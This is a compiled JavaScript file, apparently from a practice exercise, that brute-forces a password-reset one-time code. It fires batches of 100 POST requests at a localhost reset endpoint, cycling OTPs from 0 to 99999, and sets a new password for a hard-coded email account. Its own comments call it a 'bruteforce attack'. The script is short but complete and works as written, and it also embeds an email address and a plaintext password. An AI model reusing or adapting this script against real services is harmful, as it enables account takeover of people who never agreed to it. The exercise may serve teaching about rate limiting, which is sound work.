"use strict";
//since ts is used, use import instead of require
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
//sending request in a loop --> bruteforce attack
//now call this sendRequest function inside a for loop
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "jordancenataker@gmail.com",
            otp: otp,
            newPassword: "anish@34w4",
        });
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "http://localhost:3000/reset-password",
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };
        //putting this inside a try catch for backend error handling.
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
            // console.log(e);
        }
    });
}
//batching made for 100 batch requests at a time
//processing 100 reqs at a time, if not then memory will run out.
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 99999; i += 100) {
            const p = [];
            for (let j = 0; j < 100; j++) {
                console.log(i);
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p);
        }
    });
}
main();
